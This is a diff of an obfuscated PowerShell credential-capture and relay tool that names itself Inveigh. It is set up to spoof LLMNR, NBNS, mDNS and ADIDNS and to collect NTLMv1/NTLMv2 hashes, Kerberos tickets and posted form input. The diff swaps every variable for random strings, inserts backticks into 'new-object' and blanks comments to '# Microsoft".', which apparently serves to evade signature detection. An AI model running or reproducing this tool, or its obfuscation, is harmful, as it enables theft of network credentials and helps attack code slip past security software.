+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.enumerate = ne`w`-`ob`je`ct System.Collections.ArrayList
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.IP_capture_list = ne`w`-`ob`je`ct System.Collections.ArrayList
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.log = ne`w`-`ob`je`ct System.Collections.ArrayList
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.kerberos_TGT_list = ne`w`-`ob`je`ct System.Collections.ArrayList
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.kerberos_TGT_username_list = ne`w`-`ob`je`ct System.Collections.ArrayList
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.NTLMv1_list = ne`w`-`ob`je`ct System.Collections.ArrayList
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.NTLMv1_username_list = ne`w`-`ob`je`ct System.Collections.ArrayList
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.NTLMv2_list = ne`w`-`ob`je`ct System.Collections.ArrayList
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.NTLMv2_username_list = ne`w`-`ob`je`ct System.Collections.ArrayList
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.POST_request_list = ne`w`-`ob`je`ct System.Collections.ArrayList
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.valid_host_list = ne`w`-`ob`je`ct System.Collections.ArrayList
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.ADIDNS_table = [HashTable]::Synchronized(@{})
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.relay_privilege_table = [HashTable]::Synchronized(@{})
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.relay_failed_login_table = [HashTable]::Synchronized(@{})
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.relay_history_table = [HashTable]::Synchronized(@{})
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.request_table = [HashTable]::Synchronized(@{})
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.session_socket_table = [HashTable]::Synchronized(@{})
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.session_table = [HashTable]::Synchronized(@{})
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.session_message_ID_table = [HashTable]::Synchronized(@{})
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.session_lock_table = [HashTable]::Synchronized(@{})
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.SMB_session_table = [HashTable]::Synchronized(@{})
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.domain_mapping_table = [HashTable]::Synchronized(@{})
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.group_table = [HashTable]::Synchronized(@{})
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.session_count = 0
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.session = @()
 }
 
-if($LightOval.running)
+if($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.running)
 {
-    Write-TableSteam "[-] Inveigh is already running"
+    Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha "[-] Inveigh is already running"
     throw
 }
 
-$LightOval.stop = $false
+$sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.stop = $false
 
-if(!$LightOval.relay_running)
+if(!$sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.relay_running)
 {
-    $LightOval.cleartext_file_queue = ne`w-`obje`ct System.Collections.ArrayList
-    $LightOval.console_queue = ne`w-`obje`ct System.Collections.ArrayList
-    $LightOval.HTTP_challenge_queue = ne`w-`obje`ct System.Collections.ArrayList
-    $LightOval.log_file_queue = ne`w-`obje`ct System.Collections.ArrayList
-    $LightOval.NTLMv1_file_queue = ne`w-`obje`ct System.Collections.ArrayList
-    $LightOval.NTLMv2_file_queue = ne`w-`obje`ct System.Collections.ArrayList
-    $LightOval.output_queue = ne`w-`obje`ct System.Collections.ArrayList
-    $LightOval.POST_request_file_queue = ne`w-`obje`ct System.Collections.ArrayList
-    $LightOval.HTTP_session_table = [HashTable]::Synchronized(@{})
-    $LightOval.console_input = $true
-    $LightOval.console_output = $false
-    $LightOval.file_output = $false
-    $LightOval.HTTPS_existing_certificate = $false
-    $LightOval.HTTPS_force_certificate_delete = $false
-    $LightOval.log_output = $true
-    $LightOval.cleartext_out_file = $SilkySmelly + "\Inveigh-AskEffect.txt"
-    $LightOval.log_out_file = $SilkySmelly + "\Inveigh-BatAfraid.txt"
-    $LightOval.NTLMv1_out_file = $SilkySmelly + "\Inveigh-MarketJuggle.txt"
-    $LightOval.NTLMv2_out_file = $SilkySmelly + "\Inveigh-WishMetal.txt"
-    $LightOval.POST_request_out_file = $SilkySmelly + "\Inveigh-FormInput.txt"
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.cleartext_file_queue = ne`w`-`ob`je`ct System.Collections.ArrayList
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.console_queue = ne`w`-`ob`je`ct System.Collections.ArrayList
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.HTTP_challenge_queue = ne`w`-`ob`je`ct System.Collections.ArrayList
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.log_file_queue = ne`w`-`ob`je`ct System.Collections.ArrayList
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.NTLMv1_file_queue = ne`w`-`ob`je`ct System.Collections.ArrayList
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.NTLMv2_file_queue = ne`w`-`ob`je`ct System.Collections.ArrayList
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue = ne`w`-`ob`je`ct System.Collections.ArrayList
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.POST_request_file_queue = ne`w`-`ob`je`ct System.Collections.ArrayList
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.HTTP_session_table = [HashTable]::Synchronized(@{})
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.console_input = $true
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.console_output = $false
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.file_output = $false
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.HTTPS_existing_certificate = $false
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.HTTPS_force_certificate_delete = $false
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.log_output = $true
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.cleartext_out_file = $NEfQfhYIiNOOsRWGcSaBKnaQpZTkphwGrbcV + "\Inveigh-AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF.txt"
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.log_out_file = $NEfQfhYIiNOOsRWGcSaBKnaQpZTkphwGrbcV + "\Inveigh-idhIIRDfEXQkKYMkXyGYOQlLudM.txt"
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.NTLMv1_out_file = $NEfQfhYIiNOOsRWGcSaBKnaQpZTkphwGrbcV + "\Inveigh-kjvPVCdFXuxSuyUrLYKXNGfiFNSGTLrUegmqtfkuLYrT.txt"
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.NTLMv2_out_file = $NEfQfhYIiNOOsRWGcSaBKnaQpZTkphwGrbcV + "\Inveigh-wrjRNTpkoQfiiqptAqvnnh.txt"
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.POST_request_out_file = $NEfQfhYIiNOOsRWGcSaBKnaQpZTkphwGrbcV + "\Inveigh-FormInput.txt"
 }
 
-if($LinenTrick -eq 'Auto')
+if($RiBdtbrsRvAOaKjORUfNDsWCGnrqvTECqlDxhyr -eq 'Auto')
 {
-    $DressGround = [Bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
+    $AdStsmmkNAXxRqgOZkjFyIskPQvPdRYR = [Bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
 }
 else
 {
  
-    if($LinenTrick -eq 'Y')
+    if($RiBdtbrsRvAOaKjORUfNDsWCGnrqvTECqlDxhyr -eq 'Y')
     {
-        $MachoUnique = [Bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
-        $DressGround = $true
+        $MEgFqdevkkZrgANvEeWlABCMsADmTFOBPUrAXStuIhs = [Bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
+        $AdStsmmkNAXxRqgOZkjFyIskPQvPdRYR = $true
     }
     else
     {
-        $DressGround = $false
+        $AdStsmmkNAXxRqgOZkjFyIskPQvPdRYR = $false
     }
     
 }
 
-if($ShopStop -eq 'Y')
+if($eSkNEpnnSUnlgKfPeoyUkoUgMDg -eq 'Y')
 {
 
-    $GroundTest = netsh advfirewall show allprofiles state | Where-Object {$_ -match 'ON'}
+    $CduxWcgUktkGooeiHSjKCBdGSMykYSKcPolofoBwSNVdg = netsh advfirewall show allprofiles state | Where-Object {$_ -match 'ON'}
 
-    if($ChargeClap -eq 'Y')
+    if($XQYPwdDHgZKeoLOpHQUhQCuNLwfmtOFbrxtKDcERAyxo -eq 'Y')
     {
-        $PoliteSquare = netstat -anp TCP | findstr LISTENING | findstr /C:"$RightSnail`:$LunchCheat "
+        $ASzHrSwWLHAAvNypyORGCKCiwuqNqla = netstat -anp TCP | findstr LISTENING | findstr /C:"$JWYgYLitWgWEMqXjWtRtTtWTbdhYvXBLGSKZGfyA`:$LwDfsPrfdttvoEsdSBgdEUwjBXpltVybimvJb "
     }
 
-    if($SourBottle -eq 'Y')
+    if($zXuJKxMkcdZHqkkVbrPql -eq 'Y')
     {
-        $DustyArm = netstat -anp TCP | findstr LISTENING | findstr /C:"$RightSnail`:$HarmFruit "
+        $fjUiuJaAOsXyYHjApORCMpx = netstat -anp TCP | findstr LISTENING | findstr /C:"$JWYgYLitWgWEMqXjWtRtTtWTbdhYvXBLGSKZGfyA`:$ebIBhGGOpbSBFXWqVDkNgnIkDLxkcIi "
     }
 
-    if($JumpyWrench -eq 'Y')
+    if($QwSMzXPWnDpEnfpPpksOdTKwwVNMJkIdZB -eq 'Y')
     {
-        $LethalFrog = netstat -anp TCP | findstr LISTENING | findstr /C:"$RightSnail`:$OafishAllow "
+        $lSHOxkbfbdxsmvkZUHJXvgEdcOx = netstat -anp TCP | findstr LISTENING | findstr /C:"$JWYgYLitWgWEMqXjWtRtTtWTbdhYvXBLGSKZGfyA`:$uVKWZlyRdsxhxHZhEhpVHaVYWFrjLZNRwXVHZiokBazh "
     }
 
-    if($HomelyShow -eq 'Y' -and !$DressGround)
+    if($tPEylzZKZOmcrNuZqaNvxfEfrUAkL -eq 'Y' -and !$AdStsmmkNAXxRqgOZkjFyIskPQvPdRYR)
     {
-        $BottleRush = netstat -anp UDP | findstr /C:"0.0.0.0:53 "
-        $BottleRush = $false
+        $LacPHSoCcoXnrVjaQvmp = netstat -anp UDP | findstr /C:"0.0.0.0:53 "
+        $LacPHSoCcoXnrVjaQvmp = $false
     }
 
-    if($LipMeat -eq 'Y' -and !$DressGround)
+    if($PFkUZTrIToIoyXaKEeXORSPy -eq 'Y' -and !$AdStsmmkNAXxRqgOZkjFyIskPQvPdRYR)
     {
-        $YarnLate = netstat -anp UDP | findstr /C:"0.0.0.0:5355 "
-        $YarnLate = $false
+        $WLbjpNavxbORRQlYAaINcPuFDsr = netstat -anp UDP | findstr /C:"0.0.0.0:5355 "
+        $WLbjpNavxbORRQlYAaINcPuFDsr = $false
     }
 
-    if($BoilClever -eq 'Y' -and !$DressGround)
+    if($QdOGoORVrhoEArPgHPqrqy -eq 'Y' -and !$AdStsmmkNAXxRqgOZkjFyIskPQvPdRYR)
     {
-        $ArtTested = netstat -anp UDP | findstr /C:"0.0.0.0:5353 "
+        $KfptshEvZXNPSbilGnRcI = netstat -anp UDP | findstr /C:"0.0.0.0:5353 "
     }
 
 }
 
-if(!$DressGround)
+if(!$AdStsmmkNAXxRqgOZkjFyIskPQvPdRYR)
 {
 
-    if($SourBottle -eq 'Y')
+    if($zXuJKxMkcdZHqkkVbrPql -eq 'Y')
     {
-        Write-TableSteam "[-] HTTPS requires elevated privileges"
+        Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha "[-] HTTPS requires elevated privileges"
         throw
     }
 
-    if($PlugTour -eq 'Y')
+    if($LPmXJzyXqTgdUoElyxFCYzOJzqmSu -eq 'Y')
     {
-        Write-TableSteam "[-] SpooferLearning requires elevated privileges"
+        Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha "[-] SpooferLearning requires elevated privileges"
         throw
     }
 
-    if($SlimyCable -eq 'File')
+    if($QXplYkjxeRFAgTbHwoZGdRyj -eq 'File')
     {
-        Write-TableSteam "[-] Pcap file output requires elevated privileges"
+        Write-MHwNzNilRQNEbjvmyzuuQvvhzULRha "[-] Pcap file output requires elevated privileges"
         throw
     }
 
-    if(!$WickedRare.ContainsKey('NBNS'))
+    if(!$eIfNtyVLQymnQThpxABZe.ContainsKey('NBNS'))
     {
-        $PeckFirst = "Y"
+        $FgNBtZxZNMexFHUNkQWMnvvJvIQQotCEGqezQiWxHPbO = "Y"
     }
 
-    $NorthAmuck = "N"
+    $UgjMonOdclnvuXTUStjJPlyfcIaSHwykwOJbBB = "N"
 }
 
-$LightOval.hostname_spoof = $false
-$LightOval.running = $true
+$sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.hostname_spoof = $false
+$sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.running = $true
 
-if($HoverMug -eq 'Y')
+if($GFEiVoeWYTuTqJUBiwnTtkzbJfXbddMLJZPAJ -eq 'Y')
 {
-    $LightOval.status_output = $true
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.status_output = $true
 }
 else
 {
-    $LightOval.status_output = $false
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.status_output = $false
 }
 
-if($NoticeLiquid -eq 'Y')
+if($osUTjytCcqukfNwUTFmGbOOpoKFGWaleocLbR -eq 'Y')
 {
-    $LightOval.output_stream_only = $true
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_stream_only = $true
 }
 else
 {
-    $LightOval.output_stream_only = $false
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_stream_only = $false
 }
 
-if($MeekSmoggy)
+if($ljmosEibVSNBPotWNpujNBqreoZueTjDFsfrajowAsCn)
 {
 
-    if($DressGround)
+    if($AdStsmmkNAXxRqgOZkjFyIskPQvPdRYR)
     {
-        $HomelyShow = "N"
-        $LipMeat = "N"
-        $BoilClever = "N"
-        $PeckFirst = "N"
-        $ChargeClap = "N"
-        $SourBottle = "N"
-        $JumpyWrench = "N"
+        $tPEylzZKZOmcrNuZqaNvxfEfrUAkL = "N"
+        $PFkUZTrIToIoyXaKEeXORSPy = "N"
+        $QdOGoORVrhoEArPgHPqrqy = "N"
+        $FgNBtZxZNMexFHUNkQWMnvvJvIQQotCEGqezQiWxHPbO = "N"
+        $XQYPwdDHgZKeoLOpHQUhQCuNLwfmtOFbrxtKDcERAyxo = "N"
+        $zXuJKxMkcdZHqkkVbrPql = "N"
+        $QwSMzXPWnDpEnfpPpksOdTKwwVNMJkIdZB = "N"
     }
     else
     {
-        $ChargeClap = "N"
-        $SourBottle = "N"
-        $JumpyWrench = "N"
+        $XQYPwdDHgZKeoLOpHQUhQCuNLwfmtOFbrxtKDcERAyxo = "N"
+        $zXuJKxMkcdZHqkkVbrPql = "N"
+        $QwSMzXPWnDpEnfpPpksOdTKwwVNMJkIdZB = "N"
     }
 
 }
 
-if($BaseBright -eq 1) # Microsoft".
+if($hGjKncthoprHSEMgsWUxrXKWoBIZybkBY -eq 1) # Microsoft".
 {
-    $LightOval.tool = 1
-    $LightOval.output_stream_only = $true
-    $LightOval.newline = $null
-    $RottenBed = "N"
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.tool = 1
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_stream_only = $true
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.newline = $null
+    $lkPcWVVpLUCgsOzshxhpoRVCsIGIIciiEFTOCbSPYBG = "N"
 
 }
-elseif($BaseBright -eq 2) # Microsoft".
+elseif($hGjKncthoprHSEMgsWUxrXKWoBIZybkBY -eq 2) # Microsoft".
 {
-    $LightOval.tool = 2
-    $LightOval.output_stream_only = $true
-    $LightOval.console_input = $false
-    $LightOval.newline = $null
-    $WhiteNote = "N"
-    $DollHead = "N"
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.tool = 2
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_stream_only = $true
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.console_input = $false
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.newline = $null
+    $jjFnwMjlUxGLCApPYzLoDktsIGYjfDUqWDUXDZ = "N"
+    $qbmBmJvYTsbYUvEKbqNCbOv = "N"
 
-    switch ($RottenBed)
+    switch ($lkPcWVVpLUCgsOzshxhpoRVCsIGIIciiEFTOCbSPYBG)
     {
 
         'Low'
         {
-            $RottenBed = "Low"
+            $lkPcWVVpLUCgsOzshxhpoRVCsIGIIciiEFTOCbSPYBG = "Low"
         }
 
         'Medium'
         {
-            $RottenBed = "Medium"
+            $lkPcWVVpLUCgsOzshxhpoRVCsIGIIciiEFTOCbSPYBG = "Medium"
         }
 
         default
         {
-            $RottenBed = "Y"
+            $lkPcWVVpLUCgsOzshxhpoRVCsIGIIciiEFTOCbSPYBG = "Y"
         }
 
     }
@@ -458,421 +458,421 @@ elseif($BaseBright -eq 2) # Microsoft".
 }
 else
 {
-    $LightOval.tool = 0
-    $LightOval.newline = $null
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.tool = 0
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.newline = $null
 }
 
-$LightOval.netBIOS_domain = (Get-ChildItem -path env:userdomain).Value
-$LightOval.computer_name = (Get-ChildItem -path env:computername).Value
+$sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.netBIOS_domain = (Get-ChildItem -path env:userdomain).Value
+$sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.computer_name = (Get-ChildItem -path env:computername).Value
 
 try
 {
-    $LightOval.DNS_domain = ((Get-ChildItem -path env:userdnsdomain -ErrorAction 'SilentlyContinue').Value).ToLower()
-    $LightOval.DNS_computer_name = ($LightOval.computer_name + "." + $LightOval.DNS_domain).ToLower()
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.DNS_domain = ((Get-ChildItem -path env:userdnsdomain -ErrorAction 'SilentlyContinue').Value).ToLower()
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.DNS_computer_name = ($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.computer_name + "." + $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.DNS_domain).ToLower()
 
-    if(!$LightOval.domain_mapping_table.($LightOval.netBIOS_domain))
+    if(!$sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.domain_mapping_table.($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.netBIOS_domain))
     {
-        $LightOval.domain_mapping_table.Add($LightOval.netBIOS_domain,$LightOval.DNS_domain)
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.domain_mapping_table.Add($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.netBIOS_domain,$sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.DNS_domain)
     }
 
 }
 catch
 {
-    $LightOval.DNS_domain = $LightOval.netBIOS_domain
-    $LightOval.DNS_computer_name = $LightOval.computer_name
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.DNS_domain = $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.netBIOS_domain
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.DNS_computer_name = $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.computer_name
 }
 
 # Microsoft".
 # Microsoft".
-$LightOval.output_queue.Add("[*] Inveigh $WoolSnails started at $(Get-Date -format s)") > $null
+$sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[*] Inveigh $besbIZCENYbZaNorwgElwSZvHakWRXW started at $(Get-Date -format s)") > $null
 
-if($LinenTrick -eq 'Y' -or $DressGround)
+if($RiBdtbrsRvAOaKjORUfNDsWCGnrqvTECqlDxhyr -eq 'Y' -or $AdStsmmkNAXxRqgOZkjFyIskPQvPdRYR)
 {
 
-    if(($LinenTrick -eq 'Auto' -and $DressGround) -or ($LinenTrick -eq 'Y' -and $MachoUnique))
+    if(($RiBdtbrsRvAOaKjORUfNDsWCGnrqvTECqlDxhyr -eq 'Auto' -and $AdStsmmkNAXxRqgOZkjFyIskPQvPdRYR) -or ($RiBdtbrsRvAOaKjORUfNDsWCGnrqvTECqlDxhyr -eq 'Y' -and $MEgFqdevkkZrgANvEeWlABCMsADmTFOBPUrAXStuIhs))
     {
-        $LightOval.output_queue.Add("[+] Elevated Privilege Mode = Enabled")  > $null
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] Elevated Privilege Mode = Enabled")  > $null
     }
     else
     {
-        $LightOval.output_queue.Add("[-] Elevated Privilege Mode Enabled But Check Failed")  > $null
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[-] Elevated Privilege Mode Enabled But Check Failed")  > $null
     }
 
 }
 else
 {
-    $LightOval.output_queue.Add("[!] Elevated Privilege Mode = Disabled")  > $null
-    $NorthAmuck = "N"
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[!] Elevated Privilege Mode = Disabled")  > $null
+    $UgjMonOdclnvuXTUStjJPlyfcIaSHwykwOJbBB = "N"
 }
 
-if($GroundTest)
+if($CduxWcgUktkGooeiHSjKCBdGSMykYSKcPolofoBwSNVdg)
 {
-    $LightOval.output_queue.Add("[!] Windows Firewall = Enabled")  > $null
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[!] Windows Firewall = Enabled")  > $null
 }
 
-$LightOval.output_queue.Add("[+] Primary IP Address = $SmashDolls")  > $null
+$sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] Primary IP Address = $vuBQZyJZNvEjYbTnjNnXebFPrVqHfxqWHlPlJHgkccaYS")  > $null
 
-if($HomelyShow -eq 'Y' -or $LipMeat -eq 'Y' -or $BoilClever -eq 'Y' -or $PeckFirst -eq 'Y')
+if($tPEylzZKZOmcrNuZqaNvxfEfrUAkL -eq 'Y' -or $PFkUZTrIToIoyXaKEeXORSPy -eq 'Y' -or $QdOGoORVrhoEArPgHPqrqy -eq 'Y' -or $FgNBtZxZNMexFHUNkQWMnvvJvIQQotCEGqezQiWxHPbO -eq 'Y')
 {
-    $LightOval.output_queue.Add("[+] Spoofer IP Address = $StickLame")  > $null
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] Spoofer IP Address = $zkTvnUBoWamaHbrMDvklWqGBdwC")  > $null
 }
 
-if($LipMeat -eq 'Y' -or $PeckFirst -eq 'Y')
+if($PFkUZTrIToIoyXaKEeXORSPy -eq 'Y' -or $FgNBtZxZNMexFHUNkQWMnvvJvIQQotCEGqezQiWxHPbO -eq 'Y')
 {
 
-    if($OwnBump -gt 0)
+    if($wDCFDGIoGZceCUiHjkwAZDQXJJNKhHkWrGexcePVDeWCz -gt 0)
     {
-        $LightOval.output_queue.Add("[+] Spoofer Threshold Host = $OwnBump")  > $null
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] Spoofer Threshold Host = $wDCFDGIoGZceCUiHjkwAZDQXJJNKhHkWrGexcePVDeWCz")  > $null
     }
 
-    if($SameSneaky -gt 0)
+    if($DdjubLRjwAypaYSppdSjdNWWgjtwdcxUchRdcyC -gt 0)
     {
-        $LightOval.output_queue.Add("[+] Spoofer Threshold Network = $SameSneaky")  > $null
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] Spoofer Threshold Network = $DdjubLRjwAypaYSppdSjdNWWgjtwdcxUchRdcyC")  > $null
     }
     
 }
 
-if($TourManage)
+if($LKZKomsGsEUsPOllMavnB)
 {
-    $LightOval.ADIDNS = $TourManage
-    $LightOval.output_queue.Add("[+] ADIDNS Spoofer = $TourManage")  > $null
-    $LightOval.output_queue.Add("[+] ADIDNS Hosts Ignore = " + ($LiveSedate -join ","))  > $null
-    $LightOval.output_queue.Add("[+] ADIDNS Domain Controller = $KnownFood")  > $null
-    $LightOval.output_queue.Add("[+] ADIDNS Domain = $TrapJoin")  > $null
-    $LightOval.output_queue.Add("[+] ADIDNS Forest = $StoryFurry")  > $null
-    $LightOval.output_queue.Add("[+] ADIDNS TTL = $FarDry")  > $null
-    $LightOval.output_queue.Add("[+] ADIDNS Zone = $FullGrin")  > $null
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.ADIDNS = $LKZKomsGsEUsPOllMavnB
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] ADIDNS Spoofer = $LKZKomsGsEUsPOllMavnB")  > $null
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] ADIDNS Hosts Ignore = " + ($UOzMMsyJArPmhisyLVaGMsjMfqvxxPEEqcCGGGiDZcZ -join ","))  > $null
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] ADIDNS Domain Controller = $XUZlETEKoZKWHdmmfbBJczSphZSZBDSdIxXzDCCaAERO")  > $null
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] ADIDNS Domain = $NuKysEWfwHfjXVFRVZPgsYOxkAnIFj")  > $null
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] ADIDNS Forest = $uMFJurNQLlKXHMAtZAvWpotfqfIjJctkCymHxbpcYbcoz")  > $null
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] ADIDNS TTL = $EishpmLeabgtsVFwpBjSiSwYdQOFqXys")  > $null
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] ADIDNS Zone = $IthkijDWNkzEdhZAgWnlnNzsByVFDrWjDLQzbE")  > $null
 
-    if($LightOval.ADIDNS -contains 'NS')
+    if($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.ADIDNS -contains 'NS')
     {
-        $LightOval.output_queue.Add("[+] ADIDNS NS Record = $BouncyEven")  > $null
-        $LightOval.output_queue.Add("[+] ADIDNS NS Target Record = $ShinyAunt")  > $null
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] ADIDNS NS Record = $mUfKHWVntBnTLNKQYEtLBIaCAkwKF")  > $null
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] ADIDNS NS Target Record = $IhJmgwPnhtuPfSfJnHIiUD")  > $null
     }
 
-    if($HeatIll -eq 'Y')
+    if($hfdTDJMIWbkWdkyrTVXeElGpVPakhrijbMLWgef -eq 'Y')
     {
-        $LightOval.output_queue.Add("[+] ADIDNS ACE Add = Enabled")  > $null
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] ADIDNS ACE Add = Enabled")  > $null
     }
     else
     {
-        $LightOval.output_queue.Add("[+] ADIDNS ACE Add = Disabled")  > $null    
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] ADIDNS ACE Add = Disabled")  > $null    
     }
 
-    if($CuteGroup -eq 'Y')
+    if($NcOuDYrPMCFkGAkGVeXkawbkHNSRTshpDrpJvCbYEvB -eq 'Y')
     {
-        $LightOval.output_queue.Add("[+] ADIDNS Cleanup = Enabled")  > $null
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] ADIDNS Cleanup = Enabled")  > $null
     }
     else
     {
-        $LightOval.output_queue.Add("[+] ADIDNS Cleanup = Disabled")  > $null    
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] ADIDNS Cleanup = Disabled")  > $null    
     }
 
-    if($TourManage -eq 'Combo')
+    if($LKZKomsGsEUsPOllMavnB -eq 'Combo')
     {
-        $LightOval.request_table_updated = $true
+        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.request_table_updated = $true
     }
 
 }
 else
 {
-    $LightOval.output_queue.Add("[+] ADIDNS Spoofer = Disabled")  > $null
+    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] ADIDNS Spoofer = Disabled")  > $null
 }
 
-if($HomelyShow -eq 'Y')
+if($tPEylzZKZOmcrNuZqaNvxfEfrUAkL -eq 'Y')
 {
 
-    if($DressGround -or !$BottleRush)
+    if($AdStsmmkNAXxRqgOZkjFyIskPQvPdRYR -or !$LacPHSoCcoXnrVjaQvmp)
     {
